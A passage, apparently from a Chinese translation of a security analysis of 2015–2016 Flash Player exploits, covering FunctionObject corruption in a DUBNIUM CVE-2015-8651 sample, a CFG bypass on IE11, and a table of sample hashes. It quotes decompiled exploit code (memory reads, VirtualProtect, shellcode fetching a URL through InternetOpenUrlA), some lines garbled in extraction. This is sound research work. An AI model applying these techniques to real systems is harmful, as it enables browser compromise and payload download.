    private function _SafeStr_362()
    {
      return (_SafeStr_340.call(null));
    }
图75 用于触发shellcode执行的代码
### 6 FunctionObject对象的corruption
对于FunctionObject对象的corruption已经是屡见不鲜了，那些源自Hacking Team的exploit（CVE-2015-0349,
CVE-2015-5119, CVE-2015-5122, CVE-2015-5123）就很好的展示了相关技术。
以下是FunctionObject对象中AS3_call和AS3_apply方法的相关声明。
    class GC_AS3_EXACT(FunctionObject, ClassClosure)
    {
      ...
      // AS3 native methods
      int32_t get_length();
      Atom AS3_call(Atom thisAtom, Atom *argv, int argc);
      Atom AS3_apply(Atom thisAtom, Atom argArray);
      ...
图76 AS3_call和AS3_apply方法的声明
    Atom FunctionObject::AS3_apply(Atom thisArg, Atom argArray)
    {
      thisArg = get_coerced_receiver(thisArg);
      ...
      if (!AvmCore::isNullOrUndefined(argArray))
      {
        AvmCore* core = this->core();
        ...
        return core->exec->apply(get_callEnv(), thisArg, (ArrayObject*)AvmCore::atomToScriptObject(argArray));
      }
图77 FunctionObject::AS3_apply的定义
    /**
    * Function.prototype.call()
    */
    Atom FunctionObject::AS3_call(Atom thisArg, Atom *argv, int argc)
    {
      thisArg = get_coerced_receiver(thisArg);
      return core()->exec->call(get_callEnv(), thisArg, argc, argv);
    }
图78 FunctionObject::AS3_call的定义
如下定义了FunctionObject::AS3_call和FunctionObject::AS3_apply方法中用到的ExecMgr类。
    class ExecMgr
    {
      ...
      /** Invoke a function apply-style, by unpacking arguments from an array */
      virtual Atom apply(MethodEnv*, Atom thisArg, ArrayObject* a) = 0;
      /** Invoke a function call-style, with thisArg passed explicitly */
      virtual Atom call(MethodEnv*, Atom thisArg, int32_t argc, Atom* argv) = 0;
图79 ExecMgr中apply和call的定义
代号DUBNIUM行动中CVE-2015-8651的利用样本就借助了非常特殊的方式对FunctionObject对象进行corrupt，并通过其中的apply和call方法实现了shellcode的执行。此手法与15年7月Hacking
Team事件中泄漏的利用方法非常相似。
    package
    {
      public class Trigger
      {
        public static function dummy(... _args):void
        {
        }
      }
    }
图80 Trigger类中定义的dummy方法
下述代码说明了如何借助泄露的对象地址来获取FunctionObject对象的vftable指针。
    Trigger.dummy();
    var _local_1:uint = getObjectAddr(Trigger.dummy);
    var _local_6:uint = read32(((read32((read32((read32((_local_1 + 0x08)) + 0x14)) + 0x04)) + ((isDbg) ? 0xBC : 0xB0)) + (isMitis * 0x04)));  = new Vector.(0x00);
    var _local_10:uint;
    while (_local_10  080af90c   dds ecx
    07e85064 080af90c  dds edx
    080af90c 6cb72770
    080af910 6cb72610
    080af914 6cb73990
    080af918 6cb73a10
    080af91c 6cb9d490
    080af920 6cd8b340
    080af924 6cb73490
    080af928 75dc4317 kernel32!VirtualProtect ["stilife", 0x01, 0x00, 0x00, 0x00]);
    if (!_local_5)
    {
      return (false);
    };
    _local_18 = _se.callerEx("WinINet!InternetOpenUrlA", new [_local_5, _se.BAToStr(_se.h2b(_se.urlID)), 0x00, 0x00, 0x80000000, 0x00]);
    if (!_local_18)
    {
      _se.callerEx("WinINet!InternetCloseHandle", new [_local_5]);
      return (false);
    };
图88 shellcode中的部分调用
在这个样本中，shellcode不再是内存中一段连续的指令代码了，而是由分散的各部分调用函数组成的，我们可以直接在实现ActionScript的native层代码上设置断点来跟踪这些调用，例如，下述反汇编结果给出的是进行InternetOpenUrlA调用的那部分shellcode代码。
    * AS3 Call
    08180024 b80080e90b mov eax,0BE98000h
    08180029 94         xchg eax,esp
    0818002a 93         xchg eax,ebx
    0818002b 6800000000 push 0
    08180030 6800000000 push 0
    08180035 6800000000 push 0
    0818003a 6801000000 push 1
    0818003f 68289ed40b push 0BD49E28h
    08180044 b840747575 mov eax,offset WININET!InternetOpenA (75757440) <- Call to WININET! InternetOpenA
    08180049 ffd0       call eax
    0818004b bf50eed40b mov edi,0BD4EE50h
图89 调用InternetOpenUrlA的那部分shellcode
最后需要注意下，借助FunctionObject对象的corrupt来实现CFG保护的绕过只对Win10或Win8.1中的IE11有效，Win10中的Edge是不受影响的。
### 7 结论
在逆向Flash利用样本的过程中我们并没有被赋予太多的自由。首先，Flash Player本身是一个庞大的二进制项目，但却没有提供任何的符号文件给研究人员。
其次，很多与漏洞相关的逻辑实际上发生在AVM2的内部，这对研究人员来说是非常有问题的，因为目前并没有太多的工具能用于SWF文件的插桩和调试。
我们的策略是从字节码插桩开始并逐渐添加那些帮助性的代码，这在Flash模块或JIT层面的调试中可以选择性的使用。另外，对那些ByteArray相关的代码进行插桩能在很大程度上方便我们的调试，因为许多利用方式仍然会借助ByteArray对象的corruption来实现RW
primitives功能。
我们还发现最近的exploit都将关注点放到了MMgc上，因为通过解析内存和遍历对象可以达到访问其内部数据结构的目的，而一旦样本事先获取了RW
primitives，那么许多内部结构就很可能被用于实现代码的执行，借助随机化技术访问MMgc的内部结构可能会降低漏洞利用的成功率。此外，一个明显的事实是Flash漏洞在利用时不需要进行太多的堆喷，通常几兆字节的堆喷就非常有效了，因为堆布局有时是非常容易进行预测的，近段以来，这种堆布局和堆地址的可预测性也被大量的exploit所利用。
### 8 附录
#### 分析样本
CVE-ID | SHA1 | Discussed techniques  
---|---|---  
CVE-2015-0336 | 2ae7754c4dbec996be0bd2bbb06a3d7c81dc4ad7 | vftable corruption  
CVE-2015-5122 | e695fbeb87cb4f02917e574dabb5ec32d1d8f787 | Vector.length
corruption  
CVE-2015-7645 | 2df498f32d8bad89d0d6d30275c19127763d5568 | ByteArray.length
corruption  
CVE-2015-8446 | 48b7185a5534731726f4618c8f655471ba13be64 | GCBlock structure
abuse, JIT stack corruption  
CVE-2015-8651 (DUBNIUM) | c2cee74c13057495b583cf414ff8de3ce0fdf583 |
FunctionObject corruption  
CVE-2015-8651 (Angler) | 10c17dab86701bcdbfc6f01f7ce442116706b024 |
MethodInfo._implGPR corruption  
CVE-2016-1010 | 6fd71918441a192e667b66a8d60b246e4259982c |
ConvolutionFilter.matrix to tabStops type-confusion, MMgc parsing, JIT stack
corruption  
* * *